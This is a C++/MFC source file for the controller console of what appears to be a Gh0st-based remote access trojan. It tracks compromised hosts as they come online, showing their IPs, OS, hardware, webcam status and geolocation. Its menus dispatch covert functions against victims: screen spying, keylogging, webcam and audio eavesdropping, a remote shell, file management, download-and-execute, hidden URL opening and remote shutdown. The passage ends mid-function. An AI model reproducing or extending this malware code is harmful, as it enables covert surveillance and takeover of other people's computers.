// PcView.cpp : implementation file
//
#include "stdafx.h"
#include "DHL_yk.h"
#include "PcView.h"

#include "MainFrm.h"
#include "gh0stView.h"
#include "InputDlg.h"


#include "SerManager.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "ChangeGroup.h"
#include "LogView.h"
#include "ShowNum.h"
#include "RegDlg.h"
#include "User.h"
#include "MsgBox.h"

//#include "ClienttProxy.h"
//#include "User.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CGh0stView* g_pTabView;
extern CPcView* g_pConnectView;
extern CMainFrame* g_pFrame;
extern CLogView* g_pLogView; 
extern CShowNum* g_pNumDlg;

typedef struct
{
	char	*title;
	int		nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[20] = 
{
	{"网络",			70	},  //56
	{"外网IP",			103	},
	{"内网IP",			103	},
	{"计算机名/备注",	100	},
	{"操作系统",		67	},
	{"CPU处理器",		72	},
	{"硬盘/内存容量",	98  },
	{"视频",			42	},
	{"网络延时",		65	},
	{"服务版本",	    73	},
	{"服务端安装时间",	110	},
	{"开机运行时间",	92	},
	{"地理位置",		175	}
};

int g_Column_Width = 0;
int	g_Column_Count = (sizeof(g_Column_Data) / 8);// - !((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist;
/////////////////////////////////////////////////////////////////////////////
// CPcView

IMPLEMENT_DYNCREATE(CPcView, CListView)

CPcView::CPcView()
{

	CHAR ModuletemDis[MAX_PATH]={0};
	sprintf(ModuletemDis,"%s\\Control\\QQwry.dat",((CGh0stApp *)AfxGetApp())->ModuletemDir);   //连接目录和程序名称

	if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath(ModuletemDis);
	}
	((CGh0stApp *)AfxGetApp())->m_pConnectView = this;

}

CPcView::~CPcView()
{
}


BEGIN_MESSAGE_MAP(CPcView, CListView)
	//{{AFX_MSG_MAP(CPcView)
	ON_WM_SIZE()
	ON_WM_RBUTTONDOWN()
	ON_COMMAND(IDM_DISCONNECT, OnDisconnect)
	ON_COMMAND(IDM_FILEMANAGER, OnFilemanager)
	ON_COMMAND(IDM_SCREENSPY, OnScreenspy)
	ON_COMMAND(IDM_KEYBOARD, OnKeyboard)
	ON_COMMAND(IDM_REMOTESHELL, OnRemoteshell)
	ON_COMMAND(IDM_SYSTEM, OnSystem)
	ON_COMMAND(IDM_WEBCAM, OnWebcam)
	ON_COMMAND(IDM_AUDIO_LISTEN, OnAudioListen)
	ON_COMMAND(IDM_RENAME_REMARK, OnRenameRemark)
	ON_COMMAND(IDM_REMOVE, OnRemove)
	ON_COMMAND(IDM_LOGOFF, OnLogoff)
	ON_COMMAND(IDM_REBOOT, OnReboot)
	ON_COMMAND(IDM_SHUTDOWN, OnShutdown)
	ON_COMMAND(IDM_DOWNEXEC, OnDownexec)
	ON_COMMAND(IDM_UPDATE_SERVER, OnUpdateServer)
	ON_COMMAND(IDM_OPEN_URL_HIDE, OnOpenUrlHide)
	ON_COMMAND(IDM_OPEN_URL_SHOW, OnOpenUrlShow)
	ON_COMMAND(IDM_SELECT_ALL, OnSelectAll)
	ON_COMMAND(IDM_UNSELECT_ALL, OnUnselectAll)
	ON_COMMAND(IDM_CHANGE_GROUP, OnChangeGroup)
	ON_COMMAND(IDM_IPLIST, OnIplist)
	ON_COMMAND(IDM_IP, OnIp)
	ON_COMMAND(IDM_BEIZHU, OnBeizhu)
	ON_COMMAND(IDM_DILIXINXI, OnDilixinxi)
	ON_COMMAND(IDM_ALL, OnAll)
	ON_COMMAND(IDM_SERMANAGER, OnSermanager)
	ON_COMMAND(IDM_REGEDIT, OnRegedit)    //注册表
	ON_COMMAND(IDM_START_HIDE, OnStartHide)  //隐藏运行
	ON_COMMAND(IDM_START_NORMAL, OnStartNormal)
    ON_COMMAND(IDM_UPDATA, OnUpdata)
	ON_COMMAND(IDM_NO_START, OnNoStart)
	ON_COMMAND(IDM_ADD_SERVER, OnAddUser)  //服务器
	ON_COMMAND(IDC_AQGL_RZ, OnAqglRz)
	ON_COMMAND(IDC_AQGL_YP,OnAqglYp)
	ON_COMMAND(IDM_SHOWMSG, OnShowmsg)
/*
	ON_COMMAND(IDM_SHOW_MSG, OnShowMsg)
	ON_COMMAND(IDM_OPEN_PORT, OnOpenPort)
	ON_COMMAND(IDM_PROXY, OnProxy)
	ON_COMMAND(IDM_PORT_MAPSET, OnPortMapset)
	ON_COMMAND(IDM_PORT_MAPPING, OnPortMapping)
	ON_COMMAND(IDM_ADD_USER, OnAddUser)
	ON_COMMAND(IDM_KILLMBR, OnKillmbr)
	ON_COMMAND(IDM_CLEAN_ALL, OnCleanAll)
*/
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENPSERLISTDIALOG, OnOpenSerManagerDialog)
//	ON_MESSAGE(WM_FINDALL, OnFindALL)
//	ON_MESSAGE(WM_FIND, OnFind)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegeditDialog)  //注册表
	ON_MESSAGE(WM_OPENRUSERGDIALOG, OnOpenUserDialog)  //服务器
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcView drawing

void CPcView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code here
}

/////////////////////////////////////////////////////////////////////////////
// CPcView diagnostics

#ifdef _DEBUG
void CPcView::AssertValid() const
{
	CListView::AssertValid();
}

void CPcView::Dump(CDumpContext& dc) const
{	
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CGh0stDoc)));
	CListView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CPcView message handlers

BOOL CPcView::PreCreateWindow(CREATESTRUCT& cs) 
{
	// TODO: Add your specialized code here and/or call the base class
	cs.style |= LVS_REPORT;
	return CListView::PreCreateWindow(cs);
}

void CPcView::OnInitialUpdate() 
{
	CListView::OnInitialUpdate();
	
	m_pListCtrl = &GetListCtrl();

	//设置扩展风格 包括网格线等
//	m_pListCtrl->SetExtendedStyle(/*LVIF_PARAM |*/ LVS_EX_FULLROWSELECT | LVS_EX_HEADERDRAGDROP|LVS_EX_FLATSB|
//         LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES|LVS_EX_CHECKBOXES);

	I_ImageList.Create(16, 16, ILC_COLOR32|ILC_MASK,10, 0);
	HICON hIcon = NULL;	// 以下为加入3个图标资源
	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_SHIPIN), IMAGE_ICON, 32, 32, 0);
	I_ImageList.Add(hIcon);
	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_USER), IMAGE_ICON, 32, 32, 0);
	I_ImageList.Add(hIcon);
	ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL); 

//	m_pListCtrl->SetExtendedStyle(LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |
//		LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES );
	m_pListCtrl->SetExtendedStyle(LVIF_PARAM | LVS_EX_FULLROWSELECT | LVS_EX_HEADERDRAGDROP|
		LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES |LVS_EX_GRIDLINES );
	
	// 改变在线主机字体颜色
	
	//m_pListCtrl->SetTextColor(RGB(237,96,61)); // 橘色显示
	//m_pListCtrl->SetTextColor(RGB(240,0,150)); //粉红显示
	m_pListCtrl->SetTextColor(RGB(0,100,255)); // 蓝色显示
	
	m_pListCtrl->SetTextBkColor(-1); 
	
	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
	}
	
//	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
//	m_header.SubclassWindow(hWndHeader);

//	xtpThemeOffice2000,     // Office 2000 theme.
//	xtpThemeOfficeXP,       // Office XP theme.
//	xtpThemeOffice2003,     // Office 2003 theme.
//	xtpThemeNativeWinXP,    // Windows XP themes support.
//	xtpThemeWhidbey,        // Visual Studio 2005 theme.
//	xtpThemeOffice2007,     // Office 2007 theme.
//	xtpThemeRibbon,         // Office 2007 style ribbon theme
//	xtpThemeVisualStudio2008, // Visual Studio 2008 theme
//	xtpThemeCustom          // Custom theme.

//	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);		
//	EnableUserSortColor(false);
	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);
	m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
//	CXTPPaintManager::SetTheme(xtpThemeOffice2003);	
//	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);
	CXTPPaintManager::SetTheme(xtpThemeOfficeXP);
}

void CPcView::NewInitialUpdate()
{
	CListView::OnInitialUpdate();
	
	m_pListCtrl = &GetListCtrl();

	I_ImageList.Create(16, 16, ILC_COLOR32|ILC_MASK,10, 0);
	HICON hIcon = NULL;// 以下为加入3个图标资源
	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_SHIPIN), IMAGE_ICON, 32, 32, 0);
	I_ImageList.Add(hIcon);
	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_USER), IMAGE_ICON, 32, 32, 0);
	I_ImageList.Add(hIcon);
	ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL); 
	
	m_pListCtrl->SetExtendedStyle(LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |
		LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES );
/*
		m_pListCtrl->SetExtendedStyle(
		LVS_EX_FULLROWSELECT
		//|LVS_EX_HEADERDRAGDROP//报表头可以拖拽
		//|LVS_EX_ONECLICKACTIVATE//单击激活
		//|LVS_EX_GRIDLINES//绘制表格
		//|LVS_EX_FLATSB//扁平滚动条
		//|LVS_EX_MULTIWORKAREAS
		//| LVIF_IMAGE 
		//| LVIF_PARAM //带复选框
		//| LVIF_TEXT
		//|LVIF_IMAGE 
		//| LVIF_TEXT
		//LVS_EX_CHECKBOXES //带复选框
		//LVS_EX_TWOCLICKACTIVATE//双击激活
		|LVIS_STATEIMAGEMASK //带下划线
		);
*/	
	// 改变在线主机字体颜色
	
	//m_pListCtrl->SetTextColor(RGB(237,96,61)); // 橘色显示
	//m_pListCtrl->SetTextColor(RGB(240,0,150)); //粉红显示
	m_pListCtrl->SetTextColor(RGB(0,100,255)); // 蓝色显示
	
//	m_pListCtrl->SetTextBkColor(-1); 
	
	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
	}
	
//	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
//	m_header.SubclassWindow(hWndHeader);

//	xtpThemeOffice2000,     // Office 2000 theme.
//	xtpThemeOfficeXP,       // Office XP theme.
//	xtpThemeOffice2003,     // Office 2003 theme.
//	xtpThemeNativeWinXP,    // Windows XP themes support.
//	xtpThemeWhidbey,        // Visual Studio 2005 theme.
//	xtpThemeOffice2007,     // Office 2007 theme.
//	xtpThemeRibbon,         // Office 2007 style ribbon theme
//	xtpThemeVisualStudio2008, // Visual Studio 2008 theme
//	xtpThemeCustom          // Custom theme.

//	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);	
//	EnableUserSortColor(false);
	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);
	m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
//	CXTPPaintManager::SetTheme(xtpThemeOffice2003);	
//	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);
	CXTPPaintManager::SetTheme(xtpThemeOfficeXP);
}

void CPcView::OnSize(UINT nType, int cx, int cy) 
{
	CListView::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if (m_pListCtrl == NULL)
		return;
	
	CRect rcClient;
	GetClientRect(rcClient);
	
	int	nClientWidth = rcClient.Width();
	int nIndex = g_Column_Count - 1;
	
	if (nClientWidth < g_Column_Width)
		return;
	
	m_pListCtrl->SetColumnWidth(nIndex, nClientWidth - g_Column_Width + g_Column_Data[nIndex].nWidth);
}
/*
BOOL CPcView::DeleteIcon()
{
// 删除任务条中的图标
NOTIFYICONDATA nid;
nid.cbSize = sizeof(nid);
nid.hWnd = m_hWnd;
nid.uID = IDR_MAINFRAME;

return Shell_NotifyIcon(NIM_DELETE, &nid);
}
*/
void CPcView::OnRButtonDown(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default



	CListView::OnRButtonDown(nFlags, point);
	CMenu	popup;
	popup.LoadMenu(IDR_LIST);
	CMenu*	pM = popup.GetSubMenu(0);

	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
//	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON,p.x, p.y, AfxGetMainWnd(), 0, 0, 
//		((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());


	if (m_pListCtrl->GetSelectedCount() == 0)
	{
		for (int i = 0; i < count - 2; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
		pM->EnableMenuItem(count - 1, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
	}
	
	// 全选
	if (m_pListCtrl->GetItemCount() > 0)
	{
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_ENABLED);
		pM->EnableMenuItem(count - 1, MF_BYPOSITION | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
	

	// 先删除图标
//    DeleteIcon();
	// 将背景窗口激活
//    SetForegroundWindow();

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
//	pM->TrackPopupMenu(TPM_LEFTBUTTON|TPM_RIGHTBUTTON, p.x, p.y, this, NULL);

//	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON,p.x, p.y, AfxGetMainWnd(), 0, 0, 
//		((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());

//	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON, p.x, p.y, this);
//	CXTPCommandBars::TrackPopupMenu(pM, TPM_LEFTALIGN,p.x, p.y, AfxGetMainWnd(), 0, 0, 
//		((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());
//	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON,
//	p.x, p.y, AfxGetMainWnd(), 0, 0, ((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());
//	PostMessage(WM_USER, 0, 0);
}

BOOL IsFileExist(LPCTSTR strFileName)
{
	if(strFileName == NULL)
		return FALSE;
	
	DWORD dwAttr = ::GetFileAttributes(strFileName);
	return (dwAttr!=-1 && !(dwAttr&FILE_ATTRIBUTE_DIRECTORY) );
}


LRESULT CPcView::OnAddToList(WPARAM wParam, LPARAM lParam)
{	
	BOOL Cfsxts = NULL;
	ClientContext	*pContext = (ClientContext *)lParam;
	
	if (pContext == NULL)
		return -1;
	
	CString	strToolTipsText0, strToolTipsText1,strOS, strPwd;
	try
	{
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		CString	str;
		
		int nCnt = m_pListCtrl->GetItemCount();
		// int i = 0;
		// i = m_pListCtrl->InsertItem(nCnt, "", 0);
		
		// 带图标的IP地址
		int i = 0; 
/*		if (LoginInfo->bIsWebCam)
		{
			i = m_pListCtrl->InsertItem(nCnt, str, 0);
		}
		else
		{
			i = m_pListCtrl->InsertItem(nCnt, str, 1);
		}
*/
		// 网络IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

//		i = m_pListCtrl->InsertItem(nCnt, str, 0);

		// 网络类型
        if (LoginInfo->IPAddress.S_un.S_addr == sockAddr.sin_addr.S_un.S_addr)
        {
			i = m_pListCtrl->InsertItem(nCnt, str, 0);
            m_pListCtrl->SetItemText(i, 0, "外网");
        }
        else
        {
			i = m_pListCtrl->InsertItem(nCnt, str, 1);
            m_pListCtrl->SetItemText(i, 0, "内网"); //LoginInfo->sznet
        }


/////////////////////////////////////////////////////////////////////地理位置
		if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
		{
			str = m_QQwry->IPtoAdd(IPAddress);
			m_pListCtrl->SetItemText(i, 12, str);
		}
		else
		{
			m_pListCtrl->SetItemText(i, 12, "找不到IP数据库");
		}
/////////////////////////////////////////////////////////////////////

		// 外网IP
		m_pListCtrl->SetItemText(i, 1, IPAddress);
		
		// 内网IP
		m_pListCtrl->SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));

		// 主机名
		m_pListCtrl->SetItemText(i, 3, LoginInfo->HostName);
/*
		////////////////////////////////////////重复上线问题////////////////////////////////////////////////
		int Tmpi=0;
		for( Tmpi = 0 ; Tmpi < nCnt ; Tmpi++ ){
			if( m_pListCtrl->GetItemText( nCnt , 1 ) == m_pListCtrl->GetItemText( Tmpi , 1 )){//先判断外网IP
				if( m_pListCtrl->GetItemText( nCnt , 2 ) == m_pListCtrl->GetItemText( Tmpi , 2 )){//再判断内网IP

					m_pListCtrl->DeleteItem(Tmpi);
//	                g_pTabView->UpDateNumber();
//					g_pFrame->ShowConnectionsNumber();//更新目前的连接数
//					return 0;
				}
			}
		}
*/
		//////////////////////////////////////////////////////////////////////////////////////////////////////

		// 系统
		////////////////////////////////////////////////////////////////////////////////////////
		// 显示输出信息
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{
		case VER_PLATFORM_WIN32_NT:
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
			{
				pszOS = _T("NT");
				g_pNumDlg->NT++;
				g_pNumDlg->SetNum(IDC_WIN_NT, g_pNumDlg->NT);
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				pszOS = _T("2000");
				g_pNumDlg->Win2000++;
				g_pNumDlg->SetNum(IDC_WIN_2000, g_pNumDlg->Win2000);
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				pszOS = _T("XP");
				g_pNumDlg->XP++;
				g_pNumDlg->SetNum(IDC_WIN_XP, g_pNumDlg->XP);
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			{
				pszOS = _T("2003");
				g_pNumDlg->Win2003++;
				g_pNumDlg->SetNum(IDC_WIN_2003, g_pNumDlg->Win2003);
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Vista");  // Just Joking
					g_pNumDlg->Vista++;
					g_pNumDlg->SetNum(IDC_WIN_VISTA, g_pNumDlg->Vista);
				}
				else
				{
					pszOS = _T("2008");
					g_pNumDlg->Win2008++;
					g_pNumDlg->SetNum(IDC_WIN_2008, g_pNumDlg->Win2008);
				}
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win7");
					g_pNumDlg->Win7++;
					g_pNumDlg->SetNum(IDC_WIN_7, g_pNumDlg->Win7);
				}
                else
				{
					pszOS = _T("2008R2");
					g_pNumDlg->Win2008++;
					g_pNumDlg->SetNum(IDC_WIN_2008, g_pNumDlg->Win2008);
				}
			}
		}
		strOS.Format( "%s SP%d", pszOS, LoginInfo->OsVerInfoEx.wServicePackMajor );
		m_pListCtrl->SetItemText(i, 4, strOS);
		
		// CPU
		str.Format("%s*%dMHz", LoginInfo->CPUNumber, LoginInfo->CPUClockMhz);
		m_pListCtrl->SetItemText(i, 5, str);

		// 硬盘、内存大小
 		str.Format("%10.0fGB/%dMB",(float)(LoginInfo->DriverSize) / 1024,LoginInfo->MemSize);

		str.Replace(" ", "");
 		m_pListCtrl->SetItemText(i, 6, str);
	
		// 视频状态
		str = LoginInfo->bIsWebCam ? " 有" : " --";
		m_pListCtrl->SetItemText(i, 7, str);

		// 网络延时
		str.Format("%d/mS", LoginInfo->dwSpeed);
		m_pListCtrl->SetItemText(i, 8, str);

		//版本
		str.Format("%s", LoginInfo->Version);
 		m_pListCtrl->SetItemText(i, 9, str);

		//服务安装时间
		str.Format("%s", LoginInfo->MarkTime);
 		m_pListCtrl->SetItemText(i, 10, str);

		//开机运行时间
		str.Format("%s", LoginInfo->RunTime);
		m_pListCtrl->SetItemText(i, 11, str);

		//上线分组
		str = LoginInfo->UpGroup;
		m_pListCtrl->SetItemText(i, 13, str);


		// 指定唯一标识
		m_pListCtrl->SetItemData(i, (DWORD) pContext);

		strToolTipsText0.Format(_T("[%s/%s] -> 分组:[%s] -> 区域:[%s]"), 
			m_pListCtrl->GetItemText(i, 1),  //外网IP
			m_pListCtrl->GetItemText(i, 2),  //内网IP 
		    m_pListCtrl->GetItemText(i, 13), //上线分组
		    m_pListCtrl->GetItemText(i, 12));

		////////////////////////////////////////重复上线问题////////////////////////////////////////////////
		int Tmpi=0;
		for( Tmpi = 0 ; Tmpi < nCnt ; Tmpi++ ){
			if( m_pListCtrl->GetItemText( nCnt , 1 ) == m_pListCtrl->GetItemText( Tmpi , 1 )){//先判断外网IP
				if( m_pListCtrl->GetItemText( nCnt , 2 ) == m_pListCtrl->GetItemText( Tmpi , 2 )){//再判断内网IP
					Suanxinglianjxianshi(Tmpi);
					Cfsxts=TRUE;
				}
			}
		}

		CString LjieName;
		if(Cfsxts==NULL)  //新连接上线
		{
			LjieName="主机上线:";
		}
		else
		{
			LjieName="重复上线:";
		}

		strToolTipsText1.Format(_T("%s%s"), 
			LjieName,                        //连接类型
		    strToolTipsText0);
//		g_pLogView->InsertLogItem( strToolTipsText1, 0, 0 );

		g_pTabView->UpDateNumber();
		g_pFrame->ShowConnectionsNumber();  //更新目前的连接数

		if(Cfsxts!=NULL)  //  重复上线 退出
		{
			g_pLogView->InsertLogItem( strToolTipsText1, 0, 2 );
			return 0;
		}
		g_pLogView->InsertLogItem( strToolTipsText1, 0, 0 );

		//上线提示
		strToolTipsText1.Format("I  P: %s\n系统: Windows %s\n分组: %s\n名称: %s\n位置: %s", 
			IPAddress, 
			strOS, 
			m_pListCtrl->GetItemText(i, 13),  //上线分组
			m_pListCtrl->GetItemText(i, 3),   //名称
			m_pListCtrl->GetItemText(i, 12));

//        CIniFile m_IniFile;
//        BOOL a_chk = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "poptips", false);
//        if (a_chk == false)
//		{

//		}
//		if (!((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips)
//			g_pFrame->ShowToolTips(strToolTipsText1);

	}catch(...){}

	//上线图标闪烁提示
    CIniFile m_IniFile;
    BOOL a_chk = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "poptips", false);
	g_pFrame->OnTimerspop(a_chk,strToolTipsText1); //托盘图标状态

	//************************************
	//上线语音提示
//    CIniFile m_IniFile;
    a_chk = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "Alarm", false);
    if (a_chk != false)
    {
		PlaySound(MAKEINTRESOURCE(IDR_WAVE2),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
    }
	//************************************

	return 0;
}

void CPcView::Suanxinglianjxianshi(UINT str)
{
	CString strLogText;
		
		strLogText = m_pListCtrl->GetItemText( str, 4 );
		strLogText.MakeUpper();
		if ( strLogText.Find("NT") != -1 )
		{
			g_pNumDlg->NT--;
			g_pNumDlg->SetNum( IDC_WIN_NT, g_pNumDlg->NT );
		}
		if ( strLogText.Find("XP") != -1 )
		{
			g_pNumDlg->XP--;
			g_pNumDlg->SetNum( IDC_WIN_XP, g_pNumDlg->XP );
		}
		if ( strLogText.Find("Vista") != -1 )
		{
			g_pNumDlg->Vista--;
			g_pNumDlg->SetNum( IDC_WIN_VISTA, g_pNumDlg->Vista );
		}
		if ( strLogText.Find("Win7") != -1 )
		{
			g_pNumDlg->Win7--;
			g_pNumDlg->SetNum( IDC_WIN_7, g_pNumDlg->Win7 );
		}
		if ( strLogText.Find("2000") != -1 )
		{
			g_pNumDlg->Win2000--;
			g_pNumDlg->SetNum( IDC_WIN_2000, g_pNumDlg->Win2000 );
		}
		if ( strLogText.Find("2003") != -1 )
		{
			g_pNumDlg->Win2003--;
			g_pNumDlg->SetNum( IDC_WIN_2003, g_pNumDlg->Win2003 );
		}
		if ( strLogText.Find("2008") != -1 )
		{
			g_pNumDlg->Win2008--;
			g_pNumDlg->SetNum( IDC_WIN_2008, g_pNumDlg->Win2008 );
		}
		
		m_pListCtrl->DeleteItem(str);	

	
//	g_pTabView->UpDateNumber();
//	g_pFrame->ShowConnectionsNumber();
}

LRESULT CPcView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	CString strLogText;
	CPcView* pView = NULL;

	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	for (int n = 0; n < nTabs; n++ )
	{
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		// 删除链表过程中可能会删除Context
		try
		{
			int nCnt = pView->m_pListCtrl->GetItemCount();
			for (int i = 0; i < nCnt; i++)
			{
				if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
				{	
					strLogText.Format(("主机下线:[%s/%s] -> 分组:[%s] -> 区域:[%s]"), 
						pView->m_pListCtrl->GetItemText(i, 1),  //外网IP
			            pView->m_pListCtrl->GetItemText(i, 2),  //内网IP 
						pView->m_pListCtrl->GetItemText(i, 13),  //上线分组
						pView->m_pListCtrl->GetItemText(i, 12));
					g_pLogView->InsertLogItem( strLogText, 0, 1 );
					
					strLogText = pView->m_pListCtrl->GetItemText( i, 4 );
					strLogText.MakeUpper();
					if ( strLogText.Find("NT") != -1 )
					{
						g_pNumDlg->NT--;
						g_pNumDlg->SetNum( IDC_WIN_NT, g_pNumDlg->NT );
					}
					if ( strLogText.Find("XP") != -1 )
					{
						g_pNumDlg->XP--;
						g_pNumDlg->SetNum( IDC_WIN_XP, g_pNumDlg->XP );
					}
					if ( strLogText.Find("Vista") != -1 )
					{
						g_pNumDlg->Vista--;
						g_pNumDlg->SetNum( IDC_WIN_VISTA, g_pNumDlg->Vista );
					}
					if ( strLogText.Find("Win7") != -1 )
					{
						g_pNumDlg->Win7--;
						g_pNumDlg->SetNum( IDC_WIN_7, g_pNumDlg->Win7 );
					}
					if ( strLogText.Find("2000") != -1 )
					{
						g_pNumDlg->Win2000--;
						g_pNumDlg->SetNum( IDC_WIN_2000, g_pNumDlg->Win2000 );
					}
					if ( strLogText.Find("2003") != -1 )
					{
						g_pNumDlg->Win2003--;
						g_pNumDlg->SetNum( IDC_WIN_2003, g_pNumDlg->Win2003 );
					}
					if ( strLogText.Find("2008") != -1 )
					{
						g_pNumDlg->Win2008--;
						g_pNumDlg->SetNum( IDC_WIN_2008, g_pNumDlg->Win2008 );
					}
					pView->m_pListCtrl->DeleteItem(i);

					g_pFrame->OnTimerschushi(); //刷新托盘数值显示

					/************************************/
                    //下线提示
